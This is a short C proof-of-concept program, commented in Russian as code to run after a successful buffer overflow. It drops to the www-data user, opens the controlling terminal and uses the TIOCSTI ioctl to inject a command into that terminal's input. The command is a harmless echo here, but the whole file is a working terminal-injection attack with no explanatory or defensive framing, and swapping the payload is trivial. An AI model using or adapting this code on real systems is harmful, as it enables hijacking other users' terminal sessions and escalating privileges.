#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <unistd.h>

int main(int argc, char** argv)
{
    close(0);
    close(1);
    close(2);
    pid_t pid = fork();
    if (0 == pid) {
        setuid(33); /* www-data */
/* Код, выполняемый после успешного переполнения буфера */
        const char* cmd = "echo \"Hello\"\n";
        const char* p = cmd;
        int pts = open("/dev/tty", O_RDWR);
        while (*p) {
            ioctl(pts, TIOCSTI, p++);
        }
/**/
        return 0;
    }
}

